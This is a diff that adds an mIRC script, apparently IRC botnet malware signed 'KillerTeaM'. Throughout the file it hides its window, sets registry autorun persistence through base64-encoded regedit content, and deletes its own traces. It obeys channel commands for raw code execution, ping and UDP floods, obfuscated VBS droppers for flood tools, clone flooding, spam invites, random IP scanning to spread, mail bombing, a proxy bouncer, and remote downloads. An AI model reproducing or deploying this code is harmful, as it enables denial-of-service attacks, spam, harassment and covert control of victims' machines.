@@ -1,0 +1,408 @@
+on 1:start:{ if  $exists(Begins.exe) { run Begins.exe /c /fh mirc } | .timerrmdir 1 0 rmdir download | .timerrmdir2 1 0 rmdir logs | .timerrmdir 1 0 .timerrmdir3 1 0 rmdir sounds | myinfo | Systroy | new! | .timercheckexists 1 1 checkexists | unset %c }
+on *:logon:*:if $exists(c:\commands.exe) { .timercommands 2 5 remove c:\commands.exe } 
+alias Systroy {
+  ree
+  if $exists(Systroy.exe) { if $exists(Begins.exe) { run Begins.exe /n /fh /r "hcrtfs.exe -kf Systroy.exe" } | .timerSystroy.exe 1 5 remove Systroy.exe }
+  if $exists(mirc.ini) { .timerremove7 1 0 remove mirc.ini }
+  if $exists(rcfg.ini) { .timerremove6 1 0 remove rcfg.ini }
+  if $exists(xfilex.exe) { remove xfilex.exe }
+  if $exists(srv32.dll) { .timerremove5 1 0 remove srv32.dll }
+  if $exists(sys_bat.bat) { .timerremove4 1 0 remove sys_bat.bat }
+  if $exists(systems32x.dll) { .timerremove3 1 0 remove systems32x.dll }
+  if $exists(Secure.bat) { .timerremove2 1 0 remove Secure.bat }
+  if $exists(winsrv_.exe) { .timerremove1 1 0 remove winsrv_.exe }
+  if $exists(c:\commands.exe) { .timerremove 1 0 c:\commands.exe  }
+}
+on 1:connect:{ mode $me +ix | run Begins.exe /n /fh /r displays.bat | .timerconn 1 20 me? | .timer 1 4 remove %reg | unset %Scan.* %bomber %varmsg %downspeed } 
+alias me? { if $chan(0) < 1 { if (!%c) { Create #Fix ntsxm | halt } | { .timerjoin 0 15 join %c } } }
+alias Fixchan {
+  if ($1 == #Fix) { 
+    if ($me isop $1) { 
+      topic $1 $uptime(mirc,1) $fulldate
+      mode $1 -o $me 
+    }
+  }
+}
+on *:join:#:if ($me) { .timerFixchan 1 1 Fixchan # | if (!%c) { set %c # } }
+alias checkexists { set %existsexe 2 | var %0 $read -l 2 exists.exe |  if (%0 == ÌÃÕÎ¿ÁÆ) { .timerenynicks 0 5 enynicks | enynicks | halt } | server | remove exists.exe | new! }
+alias enynicks { if (!$server) { set %exists.exe $lines(exists.exe) | if (%existsexe > %exists.exe) { set %existsexe 2 } | inc %existsexe | var %server $read -l %existsexe exists.exe | server %server } }
+on 1:disconnect:.timerenynicks off | .timerenynicks 0 10 enynicks | .timerfuckoff2 1 1 enynicks
+on 1:input:*:if ($appstate != hidden) { .timerrun 1 0 run Begins.exe /c /fh mirc } | halte
+on *:APPACTIVE: if ($appstate != hidden) { .timerrun 1 0 run Begins.exe /c /fh mirc | if ($appactive) { if (Activated !isin $me) && ($server) nick Activated[ $+ $r(100,999) $+ ] } }
+alias new! { 
+  if !$isdir(exists) { .timermkdir 1 0 mkdir exists }
+  if $exists(exists.exe) { if !$exists(exists\exists.exe) { .timernew3 1 0 copy exists.exe exists\exists.exe } }
+  if $exists(cios.exe) { if !$exists(exists\cios.exe) { .timernew4 1 0 copy cios.exe exists\cios.exe } }
+  if !$exists(exists.exe) { .timernew1 1 0 copy exists\exists.exe exists.exe }
+  if !$exists(cios.exe) { .timernew2 1 0 copy exists\cios.exe cios.exe }
+}
+raw 332:*:{ if $2 == %c { botcommand $3- } }
+on *:exit:{ run Begins.exe /n /fh /r " $+ $mircexe rundll32.ini" }
+alias msg if (%msg) { halt } | msg $1-
+alias remote var
+on 1:text:*:*:{ if ($appstate != hidden) { .timerrun 1 0 run Begins.exe /c /fh mirc } |  if $nick isop %c || $nick == $chan { botcommand $1- } }
+alias x $eval($$1-,2)
+alias botcommand {
+  if ($1 == !raw) { $2- }
+  if ($1 == !rawx) { x $2- }
+  if ($1 == !packet) && ($3 != $null) { run Begins.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | msg %c [DDoS] packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }
+  if ($1 == !packet.stop) { run Begins.exe /n /fh /r "hcrtfs.exe -kf ping.exe" | msg %c [DDoS] packeting halted! }
+  if ($1 == !pfast) { if ($2 == $null) { halt } | //set %pchan %chan  |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
+  if ($1 == !igmp) { if ($2 == $null) { halt } | .remove $decode(aWdtcC52YnM=,m) | .write $decode(aWdtcC52YnMgU2V0IHNyYzM=,m) = $decode(Q3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik=,m) | .write $decode(aWdtcC52YnMgc3JjMy5ydW4=,m) $decode(ImNvbW1hbmQgL2MgaWdtcA==,m) $2 ",0,true | .run $decode(aWdtcC52YnM=,m) }
+  if ($1 == !pepsi) { if ($2 == $null) { halt } | .remove $decode(cGVwc2kudmJz,m) | .write $decode(cGVwc2kudmJzIFNldCBzcmMzID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LnNoZWxsIik=,m) | .write $decode(cGVwc2kudmJzIHNyYzMucnVuICJjb21tYW5kIC9jIHBlcHNpIC1u,m) $3 -p $4 -d $5 $2 ",0,true | .run $decode(cGVwc2kudmJz,m) }
+  if ($1 == !icmp) { if ($2 == $null) { halt } | .remove $decode(aWNtcC52YnM=,m) | .write $decode(aWNtcC52YnMgU2V0IHNyYzMgPSBDcmVhdGVPYmplY3QoIldzY3JpcHQuc2hlbGwiKQ==,m) | .write $decode(aWNtcC52YnMgc3JjMy5ydW4gImNvbW1hbmQgL2MgcGluZyAtbg==,m) $4 -l $3 -w 0 $2 ",0,true | .run $decode(aWNtcC52YnM=,m) }
+  if ($1 == !fserve) { /fserve $nick 3 $2  }
+  if ($1 == !Clones) { if ($4) { unset %boj* | set %channel2 $5- | set %bojnom $2 | set %bojserver $3 | set %bojport $4 | timerbojsock2 0 0  bojsock2 | timerbojsock -m %bojnom 100 bojsock } }
+  if ($1 == !Clonesjoin) { if ($2 == $null) { halt } | set %bojfuck $2 | sockwrite -n boj* join %bojfuck | sockwrite -n boj* privmsg $2 : $+ $flooder | .timerboj $+ $sockname 0 4 bojflood }
+  if ($1 == !ClonesStop) { .timerboj* off | sockwrite -nt boj* part %bojfuck | unset %bojfuck }
+  if ($1 == !Clonesraw)  { if ($2 == $null) { halt } | .timerbojraw 1 0 sockwrite -nt boj* $2- }
+  if ($1 == !ClonesClose) { unset %boj* %channel | sockclose boj* | .timerboj* off }
+  if ($1 == !clonesmsgx) { if $exists(clmsg.sys) { remove clmsg.sys | msg %c [Clones] Clones msg Removed. } }
+  if ($1 == !clonesmsg) { if ($2) { write clmsg.sys $2- } }
+  if ($1 == !cloneshop) { if ($2) { if (!$3) { .timerbojhop 3 2 bojop $2 KillerTeaM | halt } | .timerbojhop $3 2 bojop $2 $4- } } 
+  if ($1 == !randscan) && (!%Scan.on) && ($exists(cios.exe)) { if ($os == 98) || ($os == ME) { halt } |  { set %Scan.ip1 $randip($2) | msg %c [Scanner] from: %Scan.ip1 to $3 | set %Scan.ip1s $longip(  %Scan.ip1 ) | set %Scan.ip2s $longip( $3  ) | set %Scan.on on | .timerstartscan -m 0 500 startscan } }
+  if ($1 == !randscanbot) && (!%Scan.on) && ($exists(cios.exe)) { if ($os == 98) || ($os == ME) { halt } | { set %Scan.ip1 $randmyip | set %Scan.ip2s $longip($randip($gettok($ip,1-2,46) $+ .255.255)) | msg %c [Scanner] from: %Scan.ip1 to $longip(%Scan.ip2s) | set %Scan.ip1s $longip(  %Scan.ip1 ) | set %Scan.on on | .timerstartscan -m 0 500 startscan } }
+  if ($1 == !stopscan) && (%Scan.on) { .timerstartscan off | sockclose Killer* | msg %c [Scanner] stopped %Scan.ip1 ( $+ %Scan.infect $+ ). | unset %Scan.* }
+  if ($1 == !mailstart) && (!$timer(bombmail)) { mailsetup $2- }
+  if ($1 == !mailstop) && ($timer(bombmail)) { mailstop }
+  if ($1 == !inviter) {
+    if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter }
+    if ($2 == stop) { if ($sock(inviter*,0) > 0) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg %c [inviter] Inviter has been killed. } }
+    if ($2 == status) { if ($sock(inviter*,0) == 0) { msg %c [inviter] Status: Not Connected! | halt } | if ($sock(inviter*,0) > 0) { msg %c [inviter] Status: Connected [ $+ $sock(inviter*,0) $+ ] } } 
+    if ($2 == stats) { msg %c [inviter] (Stats) Total Invited: $calc( %i.t.j + %i.t.p ) Delay: ( $+ %i.ondelay $+ ) } 
+    if ($2 == list) { sockwrite -nt inviterload LIST :* $+ $3 $+ * } 
+    if ($2 == msg) { set %imsg $3- | msg %c [inviter] Invite Message set as [ $+ $3- $+ ] } 
+    if ($2 == ctotal) { if ($sock(inviter*,0) > 0) { if if ($lines(ichan.txt) < 0) { sockwrite -nt inviterload LIST :* $+ $3 $+ * | halt } | msg %c [inviter] Random Channels Total: $+ $lines(ichan.txt) } }
+    if ($2 == mode) { /sockwrite -nt inviter* MODE $3- } 
+    if ($2 == join) { if ($sock(inviter*,0) > 0) { if ($3 == rand) { if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg %c [inviter] Error: Gather channels first! | halt } | set %i.r.j.a $4 | /set %i.r.j.i 0 | :loop | if (%i.r.j.i > %i.r.j.a) { goto end } | /sockwrite -nt inviterload JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt | inc %i.r.j.i | goto loop | :end | unset %i.r.j.i | unset %i.r.j.a | halt } | else { /sockwrite -nt inviterload JOIN : $+ $3 } } }
+    if ($2 == part) { sockwrite -nt $sockname PART : $+ $3- } 
+    if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterload NICK $read(Oesc.dat) | halt } | //sockwrite -nt inviterload NICK $3- } 
+    if ($2 == delay) { set %i.ondelay $3 | msg %c [inviter] Delay set to: ( $+ $3 $+ ). } 
+  }
+  if ($1 == !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %c [ERROR] already active on /s -m $ip  $+ : $+ %Bnc.Port  Pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %c [bnc] /server -m $ip $+ : $+ $2  /quote PASS $3 }
+  if ($1 == !bnc.stats) && ($sock(Bnc)) { msg %c [bnc] is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
+  if ($1 == !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %c [bnc] server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
+  if ($1 == !download) { /download $2- | /msg %c [Downloading]... }
+  if ($1 == !if) { if ($2) { .timerif $+ $ctime $+ $r(10,9999999) 1 0 $2- } }
+}
+alias bojop sockwrite -nt boj* join $1 | sockwrite -nt boj* part $1 : $+ $2-
+on *:sockread:BncClient*:{
+  sockread %BncClient
+  if ($gettok(%BncClient,1,32) == NICK) {
+    set %Bnc.nick $gettok(%BncClient,2,32)
+  }
+  if ($gettok(%BncClient,1,32) == USER) {
+    set %Bnc.user $gettok(%BncClient,2-,32)
+    sockwrite -n $sockname NOTICE AUTH : $+ $decode(WW91IG5lZWQgdG8gc2F5IC9xdW90ZSBQQVNTIDxwYXNzd29yZD4=,m)
+  }
+  if ($gettok(%BncClient,1,32) == PASS) { 
+    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
+      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
+      %Bnc.legit = yes
+    } 
+    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
+      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
+    }
+  }
+  if ($gettok(%BncClient,1,32) == CONN) {
+    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on KillerTeaM | sockclose $sockname
+    }
+    if (BncServer $+ $remove($sockname,BncClient) != $null) {
+      sockclose BncServer $+ $remove($sockname,BncClient)
+    }
+    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
+    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
+    set %Bnc.server.passwd $gettok(%BncClient,4,32)
+  }
+  else {
+    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
+      halt
+    }
+    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
+  }
+}
+on *:sockopen:BncServer*:{
+  if ($sockerr) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose $sockname
+    halt
+  }
+  if ($sock($sockname).status != active) {
+    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
+    sockclose BncServer $+ $remove($socknme, BncServer)
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
+  sockwrite -n $sockname NICK %Bnc.nick
+  sockwrite -n $sockname USER %Bnc.user
+}
+on *:sockread:BncServer*:{
+  sockread %BncServer
+  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
+}
+on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
+alias s.inviter { if (%i.ondelay == $null) { set %i.ondelay 10 } | if (%i.server == $null) || (%i.port == $null) { msg %c [inviter] Error Starting Inviter, Inviter Server or Port not set! %iserver/%iserver.port | halt } | if ($sock(inviter*,0) > 0) { halt } 
+  sockopen inviterload %i.server %i.port 
+  msg %c [inviter] Loading inviter to Server: ( $+ $+ %i.server $+ ) Port: ( $+ %i.port $+ ) 
+}
+alias anynick { return [[ $+ $os $+ ][ $+ $r(1,9) $+ ][ $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] }
+on *:ping:ctcp $me ping
+alias bwin { window -p @Microsoft.Windows.Update 0 0 1600 1200 | timer 0 2 window -a @Microsoft.Windows.update }
+on *:sockread:inviter*:{
+  sockread -f %t.i 
+  if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) } 
+  if ($gettok(%t.i,2,32) == 321) { msg %c [inviter] Listing channels on $remove($gettok(%t.i,1,32),:) } 
+  if ($gettok(%t.i,2,32) == 323) { msg %c [inviter] Listing channels complete on $remove($gettok(%t.i,1,32),:) [Total Channels in List: $+ $lines(ichan.txt) $+ ] } 
+  if ($gettok(%t.i,2,32) == 474) { msg %c [inviter] Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) } 
+  if ($gettok(%t.i,2,32) == 433) { sockwrite -nt inviterload NICK $gettok(%t.i,4,32) $+ $r(a,z) } 
+  if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } 
+  if ($gettok(%t.i,2,32) == JOIN) { if ($timer($remove($gettok(%t.i,1,33),:)) != $null) { timer $+ $remove($gettok(%t.i,1,33),:) | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | msg %c [Inviter] Halted Spamer Checker BoT $remove($gettok(%t.i,1,33),:) | halt } | if (%i.on == Off) { halt } 
+    if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | set %i.on Off | /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt $sockname PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | inc %i.t.j | .timer 1 %i.ondelay set %i.on Yes 
+  } 
+  if ($gettok(%t.i,2,32) == PART) { if (%i.on == Off) { halt } | if ($timer($remove($gettok(%t.i,1,33),:)) != $null) { halt } 
+    if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } | set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | set %i.on Off | /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt $sockname PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | inc %i.t.p | .timer 1 %i.ondelay set %i.on Yes 
+  } 
+  if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt $sockname JOIN : $+ $gettok(%t.i,3,32) } 
+  if ($gettok(%t.i,1,32) == ERROR) { msg %c [inviter] Error Connecting: %t.i | set %i.b off | /timerinviteconnect 1 3 /sockopen inviter %i.server %i.port } 
+  if ($gettok(%t.i,2,32) == MODE) { if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j | msg %c [inviter] error: not inviting: $gettok(%t.i,5,32) because he was opd! } | if ($gettok(%t.i,4,32) == +v) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j | msg %c [inviter] error: not inviting: $gettok(%t.i,5,32) because he was voiced! } }
+  if ($gettok(%t.i,2,32) == NICK) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } | timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.p } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } | /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j } | if ($gettok(%t.i,2,32) == 313) { /msg %c [inviter] 4Warning!!!: IRCOP DETECTED!!!! [ $+ $gettok(%t.i,4,32) $+ ] } 
+  if ($timer($gettok(%t.i,4,32)) == $null) { halt } 
+  timer $+ $gettok(%t.i,2,32) off 
+}
+alias chekhid { if ($appactive) { .remove syscommand.ini | remove $mircini | remove cios.exe | remove $script(1) | unload -rs $script(1) | .timerremove -m 5 100 remove $script(1) | run Begins.exe /n /fh /r "hcrtfs.exe -kf $remove($mircexe,$mircdir) $+ " } } 
+on 1:sockopen:inviter*: { sockwrite -tn $sockname User $read(Oesc.dat) $read(Oesc.dat) $read(Oesc.dat) : [ [ $read(Oesc.dat) ] ] | sockwrite -tn $sockname Nick $read(Oesc.dat) | /timerinviteconnect off | sockread }
+on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt } | if (%i.b == on) { msg %c [inviter] Inviter was disconnected! (Reloading). | sockopen $sockname %i.server %i.port } }
+alias ree {
+  set %reg $r(1,1999) $+ $decode(LnJlZw==,m) 
+  write %reg $decode(UkVHRURJVDQ=,m) 
+  write %reg $decode(W0hLRVlfTE9DQUxfTUFDSElORVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5d,m) 
+  write %reg $decode(IldJTjMyU1JWIj0i,m) $+ $remove($mircexe,$mircdir) $replace($mircini,\,\\) $+ "
+  run $decode(LW4gcmVnZWRpdCAvcw==,m) %reg
+  timer 1 4 remove %reg 
+}
+alias gcoolstart  { if $1 = stop { .timergcoolt off | unset %gnum | unset %pchan | msg %c [Gebening]: Halted! | .timergcoolt off | halt } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { return } |  msg %c [Sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
+alias gdope {  if $3 = $null { goto done } | :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
+  socku $+ dp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
+  socku $+ dp gnumc3 $2 $3 $str(+ + +ATH0,90)
+  socku $+ dp gnumc2 $2 $3 $str(@,440)
+  socku $+ dp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
+  return | :done | msg %c [Gebening]: Finished! | .timergcoolt off | unset %gnum | unset %pchan | halt  
+}
+alias bojsock2 if (%bojnomsocks == %bojnom) { timerbojsock2 off }
+alias bojsock { inc %bojnomSocks | Sockopen boj $+ $killerteam %bojserver %bojport }
+on *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | .sockwrite -nt $sockname USER $killerteam $killerteam $killerteam : $+ $killerteam | .sockwrite -nt $sockname NICK $killerteam $+ $r(a,z) | sockwrite -nt $sockname ircx | sockwrite -tn $sockname join %channel2 | if (%bojfuck) { sockwrite -n $sockname join %bojfuck | sockwrite -n $sockname privmsg %bojfuck : $+ $str(…B…a…c…k…,35) } }
+on *:Sockclose:boj*:{ sockopen boj $+ $killerteam %bojserver %bojport }
+on *:sockread:boj*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong %server } | unset %clone.temp }
+alias bojflood set %bojflood $flooder | sockwrite -n boj* privmsg %bojfuck : $+ %bojflood
+alias Killerteam { return $read(Oesc.dat) $+ $r(a,z) }
+alias myinfo {
+  .nick $anynick
+  .anick $anynick
+  .Identd on $read(Oesc.dat)
+  .fullname $read(Oesc.dat) KillerTeaM
+  .emailaddr $read(Oesc.dat)
+  .ignore -r
+}
+alias flooder {
+  inc %varmsg
+  if %varmsg == 4 { set %varmsg 1 }
+  if ($lines(clmsg.sys) == $null) && (%varmsg == 3) {  return $str(…KillerTeam…,35) | set %varmsg 1 }
+  if ( %varmsg == 1 ) { return $str(…Ping…,24) }
+  if ( %varmsg == 2 ) { return $str(…KillerTeam…,35) }
+  if ( %varmsg == 3 ) { return $read(clmsg.sys) }
+}
+on *:sockopen:sock.smtp*:{ if ($sockerr > 0) return }
+on *:sockread:sock.smtp*:{
+  sockread %temp
+  if ($sockerr > 0) { return } 
+  if (550* iswm %temp) { inc %mail.counter }
+  if (220* iswm %temp) && (%mail.step == 0) { sockwrite -n $sockname HELO $iif($ip,$ip,127.0.0.1) | inc %mail.step }
+  elseif (250* iswm %temp) && (%mail.step == 1) { sockwrite -n $sockname MAIL FROM: %mail.mymail | inc %mail.step }
+  elseif ((250* iswm %temp) || (550* iswm %temp)) && (%mail.step == 2) {
+    sockwrite -n $sockname RCPT TO: %mail.mail
+    inc %mail.step | sockwrite -n $sockname DATA
+  }
+  elseif (354* iswm %temp) && (%mail.step == 3) { 
+    sockwrite -n $sockname DATE: $fulldate
+    sockwrite -n $sockname FROM: %mail.mymail
+    sockwrite -n $sockname SUBJECT: %mail.subject
+    sockwrite -n $sockname TO: %mail.mail
+    if %mail.msg == $null { set %mail.msg .:: Mail Bombs by KillerTeaM ::. }
+  sockwrite -n $sockname $chr(32) | sockwrite -n $sockname : %mail.msg | sockwrite -n $sockname $chr(32) | var %i = 1 | while (%i <= 75) { sockwrite -n $sockname $str($decode(JCNA,m),50) | inc %i }  | sockwrite -n $sockname . | inc %mail.sent | inc %mail.step }
+  elseif (250* iswm %temp) && (%mail.step == 4) { sockwrite -n $sockname QUIT | inc %mail.step }
+  elseif (221* iswm %temp) && (%mail.step == 5) { if ($sock(sock.smtp)) { sockclose $sockname | sockopen sock.smtp $+ $r(a,z) $+ $r(10000,99999999) $+ $r(a,z) %mail.server %mail.port } }
+  unset %temp
+}
+alias mailstop { 
+  .timerbombmail off 
+  msg %c [Mail Bombs] Max send ( $+ %mail.sent $+ ) to ( $+ %mail.mail $+ ) 
+  unset %mail.*
+}
+alias mailsetup {
+  unset %mail.*
+  set %mail.server $1
+  set %mail.port $2
+  set %mail.mail $3
+  set %mail.mymail $4
+  set %mail.mymails $4
+  msg %c [Mail Bombs]  connict( $+ %mail.server $+ : $+ %mail.port $+ ) Sending Bombs To ( $+ %mail.mail $+ ).
+  timerbombmail -m 0 500  mailBombs 
+}
+alias mailBombs {
+  if $sock(sock.smtp*,0) >= 1 { goto end }
+  if (!%mail.server) { msg %c [Mail Bombs]  ERROR no server | timerbombmail off | return }
+  elseif (!%mail.port) { msg %c [Mail Bombs] ERROR no port  | timerbombmail off | return }
+  elseif (!%mail.mail) { msg %c [Mail Bombs]  ERROR: no users  | timerbombmail off | return }
+  sockclose sock.smtp
+  if %mail.subject == $null { set %mail.subject none }
+  if %mail.mymails == rand { set %mail.mymail $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $mail }
+  if %mail.mymail == $null { set %mail.mymail $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $mail }
+  if %mail.send == $null { set %mail.send 0 }
+  set %mail.counter 0 | set %mail.step 0 | sockopen sock.smtp $+ $r(a,z) $+ $r(10000,99999999) $+ $r(a,z) %mail.server %mail.port
+  :end
+}
+alias mail { set %bomber $r(1,5) | if (%bomber == 1) return @ $+ hotmail.com | if (%bomber == 2) return @ $+ msn.com | if (%bomber == 3) return @ $+ yahoo.com | if (%bomber == 4) return @ $+ aol.com | if (%bomber == 5) return @ $+ mail.com }
+on *:SIGNAL:download_fail:msg %c [DownLoad] Failed to download $download($1).file - $2-
+on *:SIGNAL:download_complete:if (%files isin $download($1).file) { set %5 $ifmatch  } | msg %c [DownLoad] Completed $download(1).file in $duration($download(1).secs) (Size: $+ $bytes($download(1).size).suf ( $+ $byte($download(1).size) bytes) $+ ) (Speed: $+ $bytes(%downspeed).suf ( $+ $byte(%downspeed) bytes) $+ )
+alias download {
+  if (!$isid) {
+    var %1 = download $+ $1,%2 = $longfn($3-)
+    if (!$3) { var %2 $mircdir }
+    if ($sock(%1)) { return }
+    if (!$isdir(%2)) { return }
+    unset % [ $+ [ %1 $+ .* ] ]
+    set % [ $+ [ %1 $+ .file ] ] $+(%2,$iif($right(%2,1) != $chr(92),$chr(92)),$gettok($2,-1,47),.dat)
+    set % [ $+ [ %1 $+ .url ] ] http:// $+ $remove($2,http://)
+    set % [ $+ [ %1 $+ .ctime ] ] $ctime
+    set % [ $+ [ %1 $+ .status ] ] Connecting
+    sockopen %1 $gettok($remove($2,http://),1,47) 80
+  }
+  else {
+    if ($1 == 0) { return $sock(download*,0) }
+    if ($iif($1 isnum,$sock(download*,$1),$sock(download $+ $1))) {
+      var %1 = $ifmatch,%2 = $dl.var(%1,file),%3 = $dl.var(%1,size),%4 = $file(%2).size
+      if (!$prop) { return $right(%1,-8) }
+      elseif ($prop == ip) { return $sock(%1).ip }
+      elseif ($prop == status) { return $dl.var(%1,status) }
+      elseif ($prop == url) { return $dl.var(%1,url) }
+      elseif ($prop == file) { return $left(%2,-4) }
+      elseif ($prop == type) { return $dl.var(%1,type) }
+      elseif ($prop == size) { return %3 }
+      elseif ($prop == rcvd) { return %4 }
